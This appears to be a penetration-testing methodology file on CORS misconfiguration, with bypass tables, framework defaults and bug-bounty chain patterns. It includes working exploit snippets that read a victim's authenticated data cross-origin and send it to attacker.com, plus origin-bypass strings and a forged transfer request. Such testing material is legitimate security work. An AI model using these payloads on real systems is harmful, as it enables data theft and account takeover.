---
name: cors-misconfiguration
description: CORS misconfiguration testing covering null origin, reflected origin, wildcard with credentials, and pre-flight bypass
depends_on: []
---

# CORS Misconfiguration

Cross-Origin Resource Sharing misconfiguration testing. Focus on null origin acceptance, reflected origin without validation, subdomain wildcard bypass, credentials=true with overly permissive origins, and pre-flight request bypass techniques.

## Attack Surface

**CORS Headers**
- `Access-Control-Allow-Origin`: which origins can read responses
- `Access-Control-Allow-Credentials`: whether cookies/auth are sent cross-origin
- `Access-Control-Allow-Methods`: permitted HTTP methods for pre-flight
- `Access-Control-Allow-Headers`: permitted request headers for pre-flight
- `Access-Control-Expose-Headers`: which response headers are readable
- `Access-Control-Max-Age`: pre-flight cache duration

**Implementation Points**
- Server-side CORS middleware (Express cors, Django CORS headers, Spring CORS)
- Reverse proxy CORS headers (nginx, Apache, Cloudflare)
- CDN/edge CORS configuration
- API gateway CORS settings
- Per-route CORS overrides

**Request Types**
- Simple requests (GET, HEAD, POST with simple content-types): no pre-flight
- Pre-flighted requests (PUT, DELETE, custom headers): OPTIONS pre-flight required
- Credentialed requests: `withCredentials: true` or `credentials: 'include'`

## Discovery Signals

| Signal | Where to Look | What It Indicates |
|--------|--------------|-------------------|
| `Access-Control-Allow-Origin` in any response | Response headers on API endpoints | CORS is configured; test for misconfig |
| `Access-Control-Allow-Credentials: true` | Response headers | Credentialed cross-origin requests allowed; high-value if origin is permissive |
| `Vary: Origin` missing on CORS-enabled endpoint | Response headers | Cache poisoning candidate (CDN serves stale ACAO) |
| `X-Cache: hit` or `Age:` on CORS-enabled response | Response headers (CDN/proxy) | Cached CORS response; test cache-key inclusion of Origin |
| WordPress `/wp-json/` endpoint exposed | Path probing, generator meta tag | Recurring CORS misconfig surface (multiple paid reports: AppSheet $10K, NordVPN, DoD, Yelp, MTN) |
| JSON API accepting `application/x-www-form-urlencoded` | Content-Type negotiation | Pre-flight bypass possible; CSRF via simple request |
| `SameSite` cookie attribute missing or `None` | Cookie inspection via DevTools | Cross-origin credential attachment in older browsers |
| postMessage handler without `event.origin` check | JavaScript source (`addEventListener('message'`) | Trust boundary bypass; CORS-adjacent DOM XSS ($62.5K Meta chain, $500 HackerOne) |
| HTTP-scheme origins accepted in CORS allowlist | `Origin: http://sub.target.com` reflected | MITM uplift: attacker on same network can inject JS in HTTP origin |
| Third-party iframe embedded on target (payments, analytics) | DOM inspection | Self-XSS on trusted third-party becomes real XSS via postMessage relay |
| Multiple subdomains with differing security posture | Subdomain enumeration (CT logs, DNS) | Weakest subdomain's XSS chains into strongest subdomain's CORS trust |
| GraphQL/REST API returning user-specific data cross-origin | Authenticated endpoint probing | Primary exfiltration target once CORS misconfig confirmed |

## High-Value Targets

- API endpoints returning sensitive user data (profile, settings, financial)
- Authentication endpoints (session info, token exchange)
- Administrative API endpoints
- File upload/download endpoints with user-specific content
- WebSocket upgrade endpoints (CORS does not apply, but Origin is checked)

## Reconnaissance

**CORS Detection**
```
# Simple CORS test
curl -H "Origin: https://attacker.com" -I https://target.com/api/user

# Check response for:
# Access-Control-Allow-Origin: https://attacker.com  (reflected!)
# Access-Control-Allow-Credentials: true              (critical with reflection)
```

**Systematic Probing**
```
Origin: https://attacker.com
Origin: null
Origin: https://target.com.attacker.com
Origin: https://attackertarget.com
Origin: https://subdomain.target.com
Origin: https://target.com%60attacker.com
Origin: https://target.com%0d%0a
```

Check each response for `Access-Control-Allow-Origin` value and whether `Access-Control-Allow-Credentials: true` is present.

## Key Vulnerabilities

### Null Origin Acceptance

**Attack**
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**When null Origin is Sent**
- `file://` protocol (local HTML files)
- Sandboxed iframes: `<iframe sandbox="allow-scripts" src="data:text/html,...">`
- Redirects from certain protocols
- Some browser-initiated requests

**Exploitation**
```html
<iframe sandbox="allow-scripts allow-forms" src="data:text/html,
<script>
  fetch('https://target.com/api/user', {credentials: 'include'})
    .then(r => r.json())
    .then(d => fetch('https://attacker.com/exfil?data=' + JSON.stringify(d)));
</script>">
</iframe>
```
The sandboxed iframe sends `Origin: null`, which the server accepts. Credentials are included, so the victim's session data is returned and exfiltrated.

### Reflected Origin

**Attack**
```
# Server reflects whatever Origin is sent:
Request:  Origin: https://attacker.com
Response: Access-Control-Allow-Origin: https://attacker.com
          Access-Control-Allow-Credentials: true
```

**Exploitation**
```html
<script>
  fetch('https://target.com/api/sensitive-data', {
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    // Exfiltrate victim's data
    new Image().src = 'https://attacker.com/steal?d=' + btoa(JSON.stringify(data));
  });
</script>
```

**Partial Reflection Variants**
- Server checks if origin contains target domain: `evil.target.com.attacker.com` passes
- Server checks if origin starts with allowed domain: `target.com.attacker.com` passes
- Server checks if origin ends with allowed domain: `evilexample.com` for `example.com` passes

### Subdomain Wildcard Bypass

**Overly Permissive Subdomain Matching**
```
# Allowed: *.target.com
# Attacker controls: xss.target.com or user-content.target.com

Origin: https://xss.target.com        -> Access-Control-Allow-Origin: https://xss.target.com
```

**Exploitation Paths**
- Subdomain takeover: claim an unclaimed subdomain via dangling DNS
- XSS on any subdomain: use XSS on `blog.target.com` to make credentialed cross-origin requests
- User-generated content subdomain: `username.target.com` controlled by attacker

**Regex Bypass**
```
# Server regex: /^https?:\/\/.*\.target\.com$/
# Bypass: https://attacker.target.com     (matches)
# Bypass: https://evil.target.com          (matches if subdomain exists)
# Bypass: https://target.com               (may NOT match - missing subdomain)
```

### Credentials with Wildcard

**Misconfiguration**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
Per spec, browsers reject this combination. But servers may send it, and:
- Some older or non-standard clients may honor it
- Server-side fetches (SSRF chains) bypass browser enforcement
- If credentials are in non-cookie form (Authorization header), ACAO:* alone is sufficient

**Wildcard Without Credentials**
```
Access-Control-Allow-Origin: *
```
Not exploitable for cookie-based auth. But exploitable if:
- API uses non-cookie auth (API key in response, bearer token in response body)
- Response contains sensitive data accessible without authentication
- Response contains CSRF tokens or other security-sensitive values

### Pre-Flight Bypass

**Simple Request Exploitation**
```
# Simple requests (no pre-flight) with:
# - Method: GET, HEAD, POST
# - Content-Type: text/plain, application/x-www-form-urlencoded, multipart/form-data
# - No custom headers

# If CORS is only enforced on pre-flight (OPTIONS):
POST /api/transfer HTTP/1.1
Content-Type: text/plain
Origin: https://attacker.com

{"amount": 1000, "to": "attacker"}
```
Server parses JSON body despite `text/plain` Content-Type. No pre-flight triggered. CORS headers on the response allow reading the result.

**Method Override**
```
# Pre-flight required for PUT/DELETE, but:
POST /api/resource HTTP/1.1
X-HTTP-Method-Override: DELETE
Content-Type: application/x-www-form-urlencoded
```
If server respects method override header, the request is treated as DELETE without triggering pre-flight (POST with simple content-type is simple).

### Vary Header Missing

**Cache Poisoning via CORS**
```
# Attacker's request:
GET /api/data HTTP/1.1
Origin: https://attacker.com
-> Response cached with: Access-Control-Allow-Origin: https://attacker.com

# Victim's request (same cache):
GET /api/data HTTP/1.1
Origin: https://legitimate.com
-> Cached response served with: Access-Control-Allow-Origin: https://attacker.com
```

If `Vary: Origin` is missing, CDN/proxy caches a response with attacker's origin, and serves it to other users. The victim's browser rejects the response (wrong ACAO) but the cache is poisoned.

### Internal Network Access

**CORS from Internal Origins**
```
# Internal application at 192.168.1.100 trusts localhost:
Access-Control-Allow-Origin: http://localhost:3000
Access-Control-Allow-Credentials: true
```
- Attacker gets code execution in victim's browser (via XSS on any site)
- JavaScript on `localhost:3000` can read internal application data
- Internal CORS policies often more permissive than external

## Origin Bypass Matrix

| Regex / Validation Pattern | Bypass Origin | Why It Works |
|---------------------------|---------------|-------------|
| `endsWith("target.com")` | `https://attacker.com/path/target.com` | Path component ends with allowed host; `endsWith` checks full URL string, not host ($1M Google Gemini report) |
| `startsWith("https://target.com")` | `https://target.com.attacker.com` | Attacker domain starts with allowed origin string |
| `includes("target.com")` | `https://attacker-target.com` or `https://target.com.attacker.com` | Substring match on attacker-controlled domain |
| `/target\.com$/` (no anchor on scheme/host) | `https://attacker.target.com` or `https://xtarget.com` | Regex matches end of string without host-boundary assertion |
| `/^https?:\/\/.*target\.com$/` | `https://evil.target.com` or `https://attacker-target.com` | `.*` before domain matches any prefix including attacker subdomain |
| `Origin: null` accepted | `<iframe sandbox="allow-scripts" src="data:text/html,...">` | Sandboxed iframes, data URIs, and `file://` protocol all send `Origin: null` |
| Scheme not validated (HTTP accepted) | `http://any.target.com` (via MITM) | Attacker on same network injects JS into HTTP-scheme trusted origin (Grammarly report) |
| Port not validated | `https://target.com:8443` or `https://target.com:443` vs bare | Port is part of the origin tuple; mismatch in validation logic |
| Case-insensitive comparison absent | `https://TARGET.COM` or `https://Target.Com` | Some validators do case-sensitive compare; DNS is case-insensitive |
| Unicode normalization gap | `https://targ%65t.com` or IDN homograph | URL-encoded or punycode origins may bypass string-match validators |
| Trailing dot in hostname | `https://target.com.` | DNS FQDN trailing dot is valid; some validators miss it |
| Backtick injection | `https://target.com%60.attacker.com` | Safari historically treated backtick as valid hostname character |
| Underscore in subdomain | `https://target_com.attacker.com` | Some regex patterns treat `_` as word boundary, matching `target` prefix |
| Wildcard + credential workaround | Origin reflected verbatim (dev "fix" for `*` + credentials spec block) | Developers replace `*` with dynamic reflection to "fix" the browser rejection, creating full bypass |

## Framework / CDN CORS Defaults

| Technology | Default CORS Behavior | Misconfiguration Risk |
|-----------|----------------------|----------------------|
| Express `cors()` (no options) | `Access-Control-Allow-Origin: *` | Safe for public APIs; dangerous if `credentials: true` added later without origin allowlist |
| Express `cors({origin: true})` | Reflects request Origin verbatim | Full reflected-origin bypass; equivalent to open CORS. Seen in production |
| Django `django-cors-headers` (CORS_ALLOW_ALL_ORIGINS=True) | Reflects all origins | Combined with `CORS_ALLOW_CREDENTIALS=True` = full bypass. Common in development configs that ship to production |
| Rails `rack-cors` (origins '*') | Wildcard origin | Safe without credentials; devs often add `credentials: true` per-route |
| Nginx `add_header` with `$http_origin` | Reflects Origin from request variable | No validation by default; must add `if` block or map for allowlist |
| Cloudflare (transform rules / workers) | No CORS headers by default | Custom workers often reflect Origin for convenience; cache does not key on Origin unless `Vary: Origin` respected |
| AWS API Gateway | Configurable per-resource; console UI suggests `*` | Default console setup creates wildcard; Lambda authorizers may add credentials independently |
| Spring `@CrossOrigin` (no params) | `Access-Control-Allow-Origin: *` | Adding `allowCredentials=true` without `allowedOrigins` causes reflected origin in older Spring versions |
| WordPress WP-JSON (core) | Reflects Origin for broad cross-origin support | Recurring misconfig surface when combined with CDN caching or permissive plugins (AppSheet, NordVPN, Yelp, DoD reports) |

## Pre-flight Cache Abuse

When `Access-Control-Max-Age` is set (common values: 3600, 7200, 86400), the browser caches the pre-flight OPTIONS response. Abuse techniques:

1. **Long-lived pre-flight poisoning**: If an endpoint returns a permissive pre-flight response for any origin, the browser caches it for `Max-Age` seconds. Subsequent requests from the attacker origin skip the OPTIONS check entirely, even if the server-side configuration changes mid-cache.

2. **Pre-flight response scope mismatch**: Some servers return a blanket pre-flight allowing all methods and headers, but the actual endpoint rejects certain methods. The cached pre-flight makes the browser believe DELETE/PUT are allowed, leading the browser to send them directly. If the server only validates CORS on OPTIONS (not the actual request), the state-change goes through.

3. **CDN-cached OPTIONS responses**: When a CDN caches the OPTIONS response without keying on Origin, attacker's permissive pre-flight response is served to all origins. Test with unique cache-buster query strings to isolate CDN behavior.

4. **Max-Age: 0 defense bypass**: Even with `Max-Age: 0`, some browsers batch pre-flight checks within a single page lifecycle or navigation, allowing a rapid follow-up request to skip the fresh pre-flight.

## Defense-Bypass Pairs

| Defense | Bypass Technique | Conditions |
|---------|-----------------|------------|
| CORS allowlist via regex | Origin string manipulation (prefix, suffix, substring, encoding) | Regex without anchored host-component parsing |
| `Access-Control-Allow-Origin: *` (blocks credentials per spec) | Server reflects Origin dynamically instead of literal `*` | Dev "fixes" the browser rejection by reflecting origin |
| CORS pre-flight blocks custom Content-Type | Switch to `text/plain` or `application/x-www-form-urlencoded`; server still parses JSON body | Server content-type agnostic (UPchieve CSRF report) |
| SameSite=Lax cookies (modern default) | Top-level navigation (form POST, `window.open`) still sends cookies; older browsers default to None | Target has users on pre-2020 Chrome, Safari, or embedded webviews |
| CSRF token validated server-side | CORS misconfig leaks CSRF token via GET, then attacker issues token-bearing POST | Reflected origin + credentials reads the token first (Zomato $550 ATO chain) |
| CSP `script-src 'self'` blocks inline JS | DOM XSS via postMessage `innerHTML` sink bypasses CSP script-src; `javascript:` URI in `location.href` | postMessage handler with no origin check |
| HSTS prevents HTTP-scheme origins | HSTS only covers domains with prior visit or preload list; new subdomains may not be covered | First-visit MITM before HSTS header received |
| `Vary: Origin` prevents cache poisoning | CDN ignores `Vary` header (some configurations); or `Vary: Origin` not sent by server | WordPress WP-JSON cache poisoning report |

## Chain Patterns

| Chain | Mechanism | Impact | Real-World Example |
|-------|-----------|--------|-------------------|
| CORS + credential reflection -> data theft | Reflected origin + `ACAC: true` allows cross-origin read of authenticated API responses | PII exfiltration, session data leak | AppSheet $10K, NordVPN, multiple DoD reports |
| CORS -> CSRF token harvest -> ATO | GET with CORS reads CSRF token from profile/settings page; POST uses stolen token to change email/password | Full account takeover | Zomato $550 report: CORS read token, then forge state-change |
| Subdomain XSS + CORS trust -> data theft | XSS on `blog.target.com` executes in trusted origin; CORS on `api.target.com` trusts `*.target.com` | Cross-origin data exfiltration via trusted subdomain | Common pattern; any subdomain XSS + wildcard CORS trust |
| Subdomain takeover + CORS trust -> data theft | Dangling CNAME on `old.target.com`; attacker claims subdomain; CORS trusts `*.target.com` | Persistent cross-origin data theft from claimed subdomain | Subdomain takeover chains into CORS trust |
| Self-XSS on trusted third-party + postMessage relay -> XSS on target | Self-XSS on payment widget origin, postMessage relay to target with origin check satisfied | Full XSS on high-value origin | Meta $62.5K: Self-XSS on payment provider -> Facebook XSS -> Instagram ATO |
| CORS cache poisoning -> DoS | Attacker poisons CDN cache with their origin in ACAO; legitimate cross-origin consumers get wrong ACAO | Denial of service for headless CMS frontends, cross-origin API consumers | WordPress.com WP-JSON cache poisoning report |
| CORS misconfig + SSRF -> internal data theft | SSRF gives URL control; server-side HTTP client follows redirect; CORS headers on internal endpoint allow read | Internal network data exfiltration | SSRF -> internal API with permissive CORS; server-side requests bypass browser CORS |
| Login CSRF + CORS -> tracking/intel | Force victim into attacker's session via login CSRF; victim's actions stored in attacker's account | Session activity surveillance | MoPub $280: login CSRF via cors-anywhere proxy bypass |

## Bypass Techniques

- Origin case manipulation: `HTTPS://TARGET.COM` vs `https://target.com`
- Port addition: `https://target.com:443` may not match `https://target.com`
- Protocol switching: `http://target.com` vs `https://target.com`
- Unicode/punycode domains: IDN homograph in Origin header
- Browser-specific Origin behavior: some browsers send different Origin formats
- WebSocket: Origin header sent but CORS not enforced by browser (server must check manually)
- Flash/Silverlight crossdomain.xml: legacy cross-origin mechanisms still present

## Testing Methodology

1. **Baseline** - Send requests with legitimate Origin, document CORS headers in response
2. **Reflection test** - Send arbitrary Origin, check if reflected in ACAO header
3. **Null origin** - Test `Origin: null` acceptance with and without credentials
4. **Subdomain variants** - Test wildcard subdomain matching, prefix/suffix attacks
5. **Credential check** - Verify `Access-Control-Allow-Credentials: true` with each permissive origin
6. **Pre-flight bypass** - Test simple request content-types with sensitive methods
7. **Cache analysis** - Check for `Vary: Origin` header, test CDN caching behavior
8. **Exploit proof** - Build HTML page demonstrating cross-origin data theft with credentials

## Validation

1. Reflected origin: attacker-controlled Origin reflected in ACAO with credentials=true, demonstrated cross-origin data read
2. Null origin: `Origin: null` accepted with credentials, sandboxed iframe PoC reading sensitive data
3. Subdomain wildcard: origin from attacker-controlled subdomain accepted, cross-origin data read
4. Pre-flight bypass: state-changing action performed via simple request without pre-flight
5. Cache poisoning: CDN serving response with wrong ACAO due to missing Vary header

## False Positives

- ACAO: * without credentials (limited impact: only unauthenticated data exposed)
- Reflected origin without credentials=true (browser blocks credentialed requests)
- CORS on endpoints returning only public data (no authentication-specific content)
- Proper Vary: Origin header preventing cache poisoning
- Strict origin allowlist with exact string matching

## Impact

- Sensitive data theft: read victim's authenticated API responses from attacker's page
- Account takeover: steal session tokens, CSRF tokens, or API keys from responses
- State modification: perform actions as victim if pre-flight bypass allows write operations
- Internal network data access: read internal application data via victim's browser
- Privacy violation: exfiltrate personal information, preferences, financial data

## Pro Tips

1. Always test with `credentials: 'include'` in the PoC; without credentials, impact is limited to public data
2. Reflected origin + credentials=true is a confirmed vulnerability regardless of other factors -- the canonical $10K+ finding
3. `null` origin acceptance is commonly overlooked; sandboxed iframe exploit is reliable and bypasses most origin allowlists
4. Check CORS on every endpoint separately; configurations often differ between routes. API gateways, per-route overrides, and middleware ordering create inconsistencies
5. Subdomain CORS is only exploitable if you can control a subdomain (takeover, XSS, or user content). Always pair subdomain CORS findings with a reachable exploitation path
6. CDN cache poisoning via CORS requires missing `Vary: Origin`; check CDN behavior with `X-Cache`, `Age`, and `CF-Cache-Status` headers. Send from two different origins and compare cached responses
7. WebSocket Origin checks are application-level, not browser-enforced; test separately from CORS
8. Build a working PoC HTML page; CORS rules are complex enough that theoretical analysis misses edge cases. Programs pay 5-10x more for ATO PoC vs "I leaked your name"
9. WordPress `/wp-json/` is a recurring CORS misconfig surface -- always probe it on any WordPress site. WP Engine, Automattic, and plugin-modified configs are frequent sources
10. CORS does NOT prevent CSRF. CORS only prevents reading the response. State-changing POST with simple content-type (form-encoded) bypasses pre-flight entirely -- the action executes even if the response is blocked
11. After confirming CORS misconfig, always escalate to ATO: read CSRF token via CORS GET, then forge state-changing POST with the stolen token. The severity gap between "data leak" and "account takeover" is the difference between Low and Critical bounty
12. Test `Origin: http://sub.target.com` (HTTP scheme) even against HTTPS endpoints. If the server trusts HTTP-scheme origins, an on-network attacker (public WiFi, ISP) can MITM an HTTP request and inject JS that makes credentialed requests to the HTTPS endpoint

## Summary

CORS misconfiguration enables cross-origin data theft when permissive origin policies combine with credential inclusion. Reflected origins, null origin acceptance, and loose subdomain matching each provide distinct attack vectors with potentially critical impact on authenticated endpoints.
